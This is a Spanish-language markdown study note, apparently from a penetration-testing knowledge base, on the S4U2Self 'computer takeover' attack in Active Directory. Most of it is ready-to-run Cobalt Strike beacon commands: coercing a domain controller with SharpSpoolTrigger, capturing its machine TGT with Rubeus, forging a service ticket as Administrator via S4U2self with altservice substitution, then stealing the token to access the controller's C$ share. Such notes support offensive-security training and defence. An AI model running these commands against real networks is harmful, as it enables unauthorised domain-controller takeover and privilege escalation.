---
tags: [ad, kerberos, s4u, computer-takeover, unconstrained-delegation]
status: completo
---

# S4U2Self — Computer Takeover

> Tienes el TGT de una cuenta de máquina (ej. capturado via unconstrained delegation) pero no puedes acceder remotamente con él — las cuentas de máquina no tienen admin local sobre sí mismas. Solución: S4U2self para obtener un ST como Administrator.

---

## Flujo del ataque

```
1. Forzar autenticación del target → capturar su TGT (Rubeus monitor)
2. S4U2self con el TGT → ST para Administrator al propio equipo
3. Sustituir sname con /altservice → ST usable para CIFS/HOST/etc.
4. Acceso como Administrator al target
```

---

## Paso 1 — Capturar el TGT (Remote Auth Trigger)

```
# Monitorizar tickets entrantes en el equipo comprometido
beacon> execute-assembly Rubeus.exe monitor /interval:5 /nowrap

# Forzar autenticación del DC hacia nosotros (SpoolSample)
beacon> execute-assembly SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
# → Rubeus captura TGT de LON-DC-1$
```

> Otros triggers: **PetitPotam** (MS-EFSRPC), archivos .lnk/.url/.searchConnector-ms

⚠️ El TGT capturado **no sirve directamente** — las cuentas de máquina no tienen admin local remoto sobre sí mismas (`ERROR_ACCESS_DENIED`).

---

## Paso 2 — S4U2self + altservice

```
beacon> execute-assembly Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:<TGT_b64> /nowrap

# /impersonateuser → usuario a impersonar
# /self            → solo S4U2self, sin S4U2proxy
# /altservice      → SPN que quieres en el ticket final
# /ticket          → TGT de la cuenta de máquina capturada
```

Rubeus hace S4U2self (ST para Administrator → LON-DC-1$) y luego sustituye el sname por `cifs/lon-dc-1`. Funciona porque CIFS corre como SYSTEM (misma cuenta de máquina).

---

## Paso 3 — Usar el ticket

```
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ST_b64>
beacon> steal_token <PID>
beacon> ls \\lon-dc-1\c$
```

---

## Diferencia con Constrained Delegation

| | Constrained Delegation | S4U2self Computer Takeover |
|--|------------------------|---------------------------|
| Requisito | `msDS-AllowedToDelegateTo` configurado | Solo el TGT de la máquina |
| S4U2proxy | Sí | No (solo S4U2self + altservice) |
| Origen del TGT | Hash de la cuenta | Capturado via auth trigger |

---

## Ver también

- [[05-ad-attacks/kerberos/unconstrained-delegation|Unconstrained Delegation]] — cómo capturar el TGT
- [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]] — uso normal de S4U
- [[05-ad-attacks/kerberos/service-name-substitution-(cs)|Service Name Substitution (CS)]] — por qué funciona el /altservice
